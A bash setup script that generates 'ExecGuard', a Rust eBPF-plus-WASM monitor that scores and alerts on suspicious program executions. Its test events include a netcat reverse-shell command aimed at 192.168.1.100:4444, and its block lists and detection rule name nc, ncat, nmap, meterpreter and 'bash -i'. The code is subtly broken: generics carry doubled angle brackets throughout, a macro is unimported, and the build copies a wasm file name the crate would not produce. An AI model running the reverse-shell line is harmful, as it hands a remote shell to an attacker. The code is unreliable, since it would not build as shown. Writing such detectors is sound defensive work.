#!/bin/bash
set -e

echo "Criando estrutura do projeto ExecGuard..."

# Diretorios
mkdir -p ~/execguard
cd ~/execguard
mkdir -p execguard-ebpf/src
mkdir -p execguard-agent/src
mkdir -p execguard-wasm/src
mkdir -p scripts

# eBPF
cat << 'INNER_EOF' > execguard-ebpf/Cargo.toml
[package]
name = "execguard-ebpf"
version = "0.1.0"
edition = "2021"

[dependencies]
aya-ebpf = "0.1"
aya-log-ebpf = "0.1"

[[bin]]
name = "execguard"
path = "src/main.rs"
INNER_EOF

cat << 'INNER_EOF' > execguard-ebpf/src/main.rs
#![no_std]
#![no_main]

use aya_ebpf::{
    macros::tracepoint,
    programs::TracePointContext,
    maps::RingBuf,
    EbpfContext,
    helpers::bpf_probe_read_user_str_bytes,
};
use aya_log_ebpf::info;

#[repr(C)]
#[derive(Clone, Copy)]
pub struct ExecEvent {
    pub pid: u32,
    pub uid: u32,
    pub gid: u32,
    pub timestamp_ns: u64,
    pub comm: [u8; 16],
    pub filename: [u8; 256],
    pub argc: u32,
    pub risk_score: f32,
}

#[map(name = "EXEC_EVENTS")]
static mut EXEC_EVENTS: RingBuf<<ExecEvent> = RingBuf::with_max_entries(1024, 0);

#[tracepoint]
pub fn execguard(ctx: TracePointContext) -> u32 {
    let mut event = ExecEvent {
        pid: ctx.pid(),
        uid: ctx.uid(),
        gid: 0,
        timestamp_ns: unsafe { aya_ebpf::helpers::gen::bpf_ktime_get_ns() },
        comm: [0; 16],
        filename: [0; 256],
        argc: 0,
        risk_score: 0.0,
    };
    
    let comm = unsafe { core::slice::from_raw_parts(ctx.comm().as_ptr() as *const u8, 16) };
    event.comm[..16].copy_from_slice(comm);
    
    let filename_ptr: u64 = unsafe { ctx.read_at::<u64>(16) };
    let _ = unsafe {
        bpf_probe_read_user_str_bytes(
            filename_ptr as *const u8,
            &mut event.filename,
        )
    };
    
    if let Some(mut entry) = unsafe { EXEC_EVENTS.reserve() } {
        entry.write(event);
        entry.submit(0);
    }
    
    0
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
INNER_EOF

# Agente
cat << 'INNER_EOF' > execguard-agent/Cargo.toml
[package]
name = "execguard-agent"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1.35", features = ["full"] }
wasmtime = "18.0"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
bytes = "1.5"
anyhow = "1.0"
INNER_EOF

cat << 'INNER_EOF' > execguard-agent/src/main.rs
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use std::time::Instant;

mod wasm_runtime;
use wasm_runtime::{WasmRuntime, HostState, ExecEvent, Alert};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let wasm_bytes = std::fs::read("execguard.wasm")?;
    let (alerts_tx, mut alerts_rx) = mpsc::channel::<Alert>(100);
    
    tokio::spawn(async move {
        while let Some(alert) = alerts_rx.recv().await {
            eprintln!(
                "\x1b[31m🚨 ALERT [Sev {}] {}: {}\x1b[0m",
                alert.severity, alert.category, alert.description
            );
        }
    });
    
    let host_state = HostState {
        banned_binaries: vec![
            "nc".into(), "ncat".into(), "nmap".into(),
            "python".into(), "python3".into(),
        ],
        process_history: Arc::new(Mutex::new(Vec::new())),
        alerts_tx,
    };
    
    let mut runtime = WasmRuntime::new(&wasm_bytes, host_state)?;
    
    let test_events = vec![
        ExecEvent {
            pid: 1234, uid: 1000, gid: 1000,
            timestamp_ns: 0,
            comm: string_to_comm("bash"),
            filename: string_to_filename("/tmp/nc -e /bin/bash 192.168.1.100 4444"),
            argc: 5, risk_score: 0.0,
        },
        ExecEvent {
            pid: 1235, uid: 0, gid: 0,
            timestamp_ns: 0,
            comm: string_to_comm("sudo"),
            filename: string_to_filename("/usr/bin/sudo"),
            argc: 1, risk_score: 0.0,
        },
        ExecEvent {
            pid: 1236, uid: 1001, gid: 1001,
            timestamp_ns: 0,
            comm: string_to_comm("python3"),
            filename: string_to_filename("/tmp/exploit.py"),
            argc: 2, risk_score: 0.0,
        },
        ExecEvent {
            pid: 1237, uid: 1002, gid: 1002,
            timestamp_ns: 0,
            comm: string_to_comm("curl"),
            filename: string_to_filename("/usr/bin/curl"),
            argc: 3, risk_score: 0.0,
        },
    ];
    
    println!("{}", "=".repeat(80));
    println!("EXECGUARD - eBPF + WASM Security Pipeline");
    println!("{}", "=".repeat(80));
    
    for event in test_events {
        let start = Instant::now();
        let enriched = runtime.process_event(&event)?;
        let elapsed = start.elapsed();
        
        let risk_color = if enriched.risk_score >= 7.0 {
            "\x1b[31m"
        } else if enriched.risk_score >= 4.0 {
            "\x1b[33m"
        } else {
            "\x1b[32m"
        };
        
        println!(
            "[{:>6}µs] PID={:<6} UID={:<6} RISK={}{:>4.1}\x1b[0m  FILE={}",
            elapsed.as_micros(),
            enriched.pid,
            enriched.uid,
            risk_color,
            enriched.risk_score,
            filename_to_string(&enriched.filename)
        );
    }
    
    println!("{}", "=".repeat(80));
    Ok(())
}

fn string_to_comm(s: &str) -> [u8; 16] {
    let mut arr = [0u8; 16];
    let bytes = s.as_bytes();
    let len = bytes.len().min(15);
    arr[..len].copy_from_slice(&bytes[..len]);
    arr
}

fn string_to_filename(s: &str) -> [u8; 256] {
    let mut arr = [0u8; 256];
    let bytes = s.as_bytes();
    let len = bytes.len().min(255);
    arr[..len].copy_from_slice(&bytes[..len]);
    arr
}

fn filename_to_string(arr: &[u8; 256]) -> String {
    let len = arr.iter().position(|&b| b == 0).unwrap_or(256);
    String::from_utf8_lossy(&arr[..len]).into_owned()
}
INNER_EOF

cat << 'INNER_EOF' > execguard-agent/src/wasm_runtime.rs
use wasmtime::{Engine, Module, Store, Memory, TypedFunc, Caller, Func};
use std::sync::{Arc, Mutex};
use serde::{Serialize, Deserialize};
use tokio::sync::mpsc;

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ExecEvent {
    pub pid: u32,
    pub uid: u32,
    pub gid: u32,
    pub timestamp_ns: u64,
    pub comm: [u8; 16],
    pub filename: [u8; 256],
    pub argc: u32,
    pub risk_score: f32,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Alert {
    pub severity: u8,
    pub category: String,
    pub description: String,
    pub timestamp_ns: u64,
}

pub struct HostState {
    pub banned_binaries: Vec<String>,
    pub process_history: Arc<Mutex<Vec<<ExecEvent>>>,
    pub alerts_tx: mpsc::Sender<<Alert>,
}

pub struct WasmRuntime {
    _engine: Engine,
    _module: Module,
    store: Store<<HostState>,
    process_fn: TypedFunc<(i32, i32), i32>,
    memory: Memory,
}

impl WasmRuntime {
    pub fn new(wasm_bytes: &[u8], host_state: HostState) -> anyhow::Result<Self> {
        let engine = Engine::default();
        let module = Module::new(&engine, wasm_bytes)?;
        let mut store = Store::new(&engine, host_state);
        let mut linker = wasmtime::Linker::new(&engine);
        
        linker.func_wrap("env", "get_local_state",
            |mut caller: Caller<'_, HostState>, key_ptr: i32, key_len: i32, out_ptr: i32, out_len: i32| -> i32 {
                let memory = caller.get_export("memory").and_then(|e| e.into_memory()).unwrap();
                let mut key_bytes = vec![0u8; key_len as usize];
                memory.read(&caller, key_ptr as usize, &mut key_bytes).unwrap();
                let key = String::from_utf8_lossy(&key_bytes);
                let state = caller.data();
                let value = match key.as_ref() {
                    "banned_binaries" => serde_json::to_vec(&state.banned_binaries).unwrap_or_default(),
                    _ => vec![],
                };
                let write_len = value.len().min(out_len as usize);
                memory.write(&mut caller, out_ptr as usize, &value[..write_len]).unwrap();
                write_len as i32
            },
        )?;
        
        linker.func_wrap("env", "emit_alert",
            |mut caller: Caller<'_, HostState>, ptr: i32, len: i32| -> i32 {
                let memory = caller.get_export("memory").and_then(|e| e.into_memory()).unwrap();
                let mut alert_bytes = vec![0u8; len as usize];
                memory.read(&caller, ptr as usize, &mut alert_bytes).unwrap();
                if let Ok(alert) = serde_json::from_slice::<Alert>(&alert_bytes) {
                    let _ = caller.data().alerts_tx.try_send(alert);
                }
                0
            },
        )?;
        
        let instance = linker.instantiate(&mut store, &module)?;
        let memory = instance.get_memory(&mut store, "memory").unwrap();
        let process_fn = instance.get_typed_func::<(i32, i32), i32>(&mut store, "process_event")?;
        
        Ok(WasmRuntime { _engine: engine, _module: module, store, process_fn, memory })
    }
    
    pub fn process_event(&mut self, event: &ExecEvent) -> anyhow::Result<ExecEvent> {
        let input_bytes = serde_json::to_vec(event)?;
        let input_len = input_bytes.len();
        const INPUT_PTR: i32 = 1024;
        const OUTPUT_PTR: i32 = 4096;
        
        self.memory.write(&mut self.store, INPUT_PTR as usize, &input_bytes)?;
        let result_len = self.process_fn.call(&mut self.store, (INPUT_PTR, input_len as i32))?;
        
        let mut output_bytes = vec![0u8; result_len as usize];
        self.memory.read(&self.store, OUTPUT_PTR as usize, &mut output_bytes)?;
        
        let enriched: ExecEvent = serde_json::from_slice(&output_bytes)?;
        Ok(enriched)
    }
}
INNER_EOF

# WASM
cat << 'INNER_EOF' > execguard-wasm/Cargo.toml
[package]
name = "execguard-wasm"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
serde = { version = "1.0", default-features = false, features = ["derive"] }
serde_json = { version = "1.0", default-features = false, features = ["alloc"] }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
INNER_EOF

cat << 'INNER_EOF' > execguard-wasm/src/lib.rs
#![no_std]
#![no_main]

extern crate alloc;
use alloc::string::String;
use alloc::vec::Vec;
use alloc::format;
use serde::{Serialize, Deserialize};

extern "C" {
    fn get_local_state(key_ptr: i32, key_len: i32, out_ptr: i32, out_len: i32) -> i32;
    fn emit_alert(alert_ptr: i32, alert_len: i32) -> i32;
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ExecEvent {
    pub pid: u32,
    pub uid: u32,
    pub gid: u32,
    pub timestamp_ns: u64,
    pub comm: [u8; 16],
    pub filename: [u8; 256],
    pub argc: u32,
    pub risk_score: f32,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Alert {
    pub severity: u8,
    pub category: String,
    pub description: String,
    pub timestamp_ns: u64,
}

#[no_mangle]
pub extern "C" fn process_event(input_ptr: i32, input_len: i32) -> i32 {
    let input_slice = unsafe {
        core::slice::from_raw_parts(input_ptr as *const u8, input_len as usize)
    };
    
    let mut event: ExecEvent = match serde_json::from_slice(input_slice) {
        Ok(e) => e,
        Err(_) => return -1,
    };
    
    let filename = cstr_to_string(&event.filename);
    let comm = cstr_to_string(&event.comm);
    
    let banned = get_banned_binaries();
    let is_banned = banned.iter().any(|b| filename.contains(b));
    let is_tmp = filename.starts_with("/tmp/");
    let is_non_root = event.uid >= 1000;
    
    let mut risk_score = 0.0f32;
    let mut alerts = Vec::new();
    
    if is_banned {
        risk_score = 10.0;
        alerts.push(Alert {
            severity: 10,
            category: String::from("BANNED_BINARY"),
            description: format!("UID {} banned: {}", event.uid, filename),
            timestamp_ns: event.timestamp_ns,
        });
    }
    
    if is_non_root && is_tmp && !is_banned {
        risk_score += 7.0;
        alerts.push(Alert {
            severity: 7,
            category: String::from("TMP_EXECUTION"),
            description: format!("UID {} exec from /tmp: {}", event.uid, filename),
            timestamp_ns: event.timestamp_ns,
        });
    }
    
    let comm_name = comm.trim();
    let file_name = filename.split('/').last().unwrap_or("");
    if !comm_name.is_empty() 
        && !file_name.contains(comm_name) 
        && !comm_name.contains("bash")
        && !comm_name.contains("sh") {
        risk_score += 3.0;
        alerts.push(Alert {
            severity: 5,
            category: String::from("COMM_MISMATCH"),
            description: format!("Comm '{}' != file '{}'", comm_name, file_name),
            timestamp_ns: event.timestamp_ns,
        });
    }
    
    if filename.contains("bash") && filename.contains("-i") {
        risk_score += 8.0;
        alerts.push(Alert {
            severity: 9,
            category: String::from("REVERSHELL_PATTERN"),
            description: format!("Possible reverse shell: {}", filename),
            timestamp_ns: event.timestamp_ns,
        });
    }
    
    for alert in &alerts {
        emit_alert_internal(alert);
    }
    
    event.risk_score = risk_score.min(10.0);
    
    let output = match serde_json::to_vec(&event) {
        Ok(v) => v,
        Err(_) => return -1,
    };
    let output_len = output.len();
    
    const OUTPUT_PTR: i32 = 4096;
    unsafe {
        core::ptr::copy_nonoverlapping(
            output.as_ptr(),
            OUTPUT_PTR as *mut u8,
            output_len
        );
    }
    
    output_len as i32
}

fn get_banned_binaries() -> Vec<&'static str> {
    vec!["nc", "ncat", "nmap", "meterpreter"]
}

fn cstr_to_string(bytes: &[u8]) -> String {
    let len = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    String::from_utf8_lossy(&bytes[..len]).into_owned()
}

fn emit_alert_internal(alert: &Alert) {
    let bytes = match serde_json::to_vec(alert) {
        Ok(v) => v,
        Err(_) => return,
    };
    let ptr = bytes.as_ptr() as i32;
    let len = bytes.len() as i32;
    unsafe {
        emit_alert(ptr, len);
    }
}

use core::alloc::{GlobalAlloc, Layout};

struct SimpleAllocator;

unsafe impl GlobalAlloc for SimpleAllocator {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        static mut HEAP: [u8; 65536] = [0; 65536];
        static mut HEAP_POS: usize = 0;
        let pos = HEAP_POS;
        HEAP_POS += layout.size();
        HEAP.as_mut_ptr().add(pos)
    }
    unsafe fn dealloc(&self, _ptr: *mut u8, _layout: Layout) {}
}

#[global_allocator]
static ALLOCATOR: SimpleAllocator = SimpleAllocator;

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
INNER_EOF

# Scripts
cat << 'INNER_EOF' > scripts/build.sh
#!/bin/bash
set -e
echo "=========================================="
echo "EXECGUARD BUILD"
echo "=========================================="
rustup target add wasm32-unknown-unknown 2>/dev/null || true
cd "$(dirname "$0")/.."
PROJECT_ROOT=$(pwd)
echo "[1/3] Compilando WASM..."
cd "$PROJECT_ROOT/execguard-wasm"
cargo build --target wasm32-unknown-unknown --release
echo "[2/3] Copiando modulo..."
cp "$PROJECT_ROOT/execguard-wasm/target/wasm32-unknown-unknown/release/execguard.wasm" \
   "$PROJECT_ROOT/execguard-agent/execguard.wasm"
echo "[3/3] Compilando agente..."
cd "$PROJECT_ROOT/execguard-agent"
cargo build --release
echo ""
echo "BUILD OK! Execute: ./scripts/test.sh"
INNER_EOF

cat << 'INNER_EOF' > scripts/test.sh
#!/bin/bash
set -e
cd "$(dirname "$0")/.."
if [ ! -f "execguard-agent/execguard.wasm" ]; then
    bash scripts/build.sh
fi
cd execguard-agent
cargo run --release
INNER_EOF

chmod +x scripts/build.sh scripts/test.sh

echo ""
echo "=========================================="
echo "SETUP CONCLUIDO!"
echo "=========================================="
echo ""
echo "Estrutura criada em: $(pwd)"
echo ""
echo "Proximos passos:"
echo "  1. cd ~/execguard"
echo "  2. ./scripts/build.sh"
echo "  3. ./scripts/test.sh"
echo ""
